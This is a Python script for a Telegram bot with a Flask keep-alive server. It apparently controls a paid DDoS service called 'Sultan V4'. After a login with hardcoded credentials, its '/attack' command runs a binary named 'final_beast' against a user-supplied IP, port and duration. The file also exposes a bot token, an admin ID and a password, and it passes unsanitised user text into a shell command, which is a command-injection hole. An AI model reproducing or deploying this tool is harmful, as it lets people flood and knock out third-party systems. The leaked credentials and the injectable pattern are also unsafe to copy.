import telebot, subprocess, threading, os, time
from flask import Flask

# --- CONFIGURATION ---
TOKEN = "8586393188:AAFH26YqG47jqc4sRyUWCjsjd-chZQRwyQ0"
bot = telebot.TeleBot(TOKEN)
app = Flask('')

# Sultan ki Asli ID aur Credentials
ADMIN_ID = 5961723105  # Teri updated ID
ADMIN_USER = "saniya"
ADMIN_PASS = "suhan"
logged_in_users = []

@app.route('/')
def home(): return "Sultan V4 God Mode is Online!"

def run_web():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

# --- ACCESS CHECK ---
def check_access(uid):
    # Agar teri ID match kar gayi toh seedha access, ya login list mein ho
    if uid == ADMIN_ID or uid in logged_in_users:
        return True
    return False

# --- COMMANDS ---

@bot.message_handler(commands=['login'])
def login(message):
    args = message.text.split()
    if len(args) == 3 and args[1] == ADMIN_USER and args[2] == ADMIN_PASS:
        if message.from_user.id not in logged_in_users:
            logged_in_users.append(message.from_user.id)
        bot.reply_to(message, "🔓 **SULTAN ACCESS GRANTED!**\nBhai, ab aapka control chalu hai.")
    else:
        bot.reply_to(message, "🚫 ID ya Password galat hai bhai!")

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    if not check_access(message.from_user.id):
        bot.reply_to(message, "🚫 **ACCESS DENIED!**\nPehle `/login saniya suhan` karein.")
        return
    
    args = message.text.split()
    if len(args) < 4:
        bot.reply_to(message, "❌ **Usage:** `/attack <IP> <PORT> <TIME>`")
        return
    
    ip, port, dur = args[1], args[2], args[3]
    bot.reply_to(message, f"🚀 **SULTAN ATTACK STARTED!**\n📍 Target: `{ip}:{port}`\n⏳ Duration: `{dur}s`")
    
    # Final Beast trigger
    subprocess.Popen(f"chmod +x final_beast && ./final_beast {ip} {port} {dur} 10", shell=True)

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, f"🔱 **SULTAN V4 IS LIVE** 🔱\n\nYour ID: `{message.from_user.id}`\n\nAdmin ho toh login karo, warna key khareedo!")

if __name__ == "__main__":
    threading.Thread(target=run_web).start()
    bot.polling(none_stop=True)
